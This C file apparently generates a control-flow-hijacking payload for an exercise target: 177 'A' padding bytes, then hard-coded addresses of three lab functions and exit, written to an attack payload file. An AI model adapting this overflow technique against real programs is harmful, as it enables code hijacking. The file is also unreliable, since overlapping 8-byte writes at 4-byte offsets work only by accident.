#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util-program.h"


int main(int argc, char **argv)
{
    char inputStr[300];  // Make sure it's large enough to accommodate the input
    unsigned long long round1_address = 0x804869b;  // Address of the 1 function
    unsigned long long round2_address = 0x80486f6;  // Address of the 2 function
    unsigned long long round3_address = 0x8048751;  // Address of the 3 function
    unsigned long long exit_address = 0xf7e0f990;  // Address of the exit function

    // Calculate the offset to reach functionPtr
    int offset = 177;

    // Fill the inputStr with 'A' to reach the functionPtr
    memset(inputStr, 'A', offset);

    // Overwrite functionPtr with the address of rescue
    *((unsigned long long*)(inputStr + offset)) = round1_address;
    *((unsigned long long*)(inputStr + offset + 4)) = round2_address;
    *((unsigned long long*)(inputStr + offset + 8)) = round3_address;
    *((unsigned long long*)(inputStr + offset + 12)) = exit_address;

    // Null-terminate the string
    inputStr[offset + sizeof(unsigned long long) + sizeof(unsigned long long) + sizeof(unsigned long long) + sizeof(unsigned long long)] = '\0';
    /* YOUR CODE: Generate buf appropriately */
    write_to_file( "attack5-payload", inputStr , 300, FILE_CLEAR );
    exit(0);
}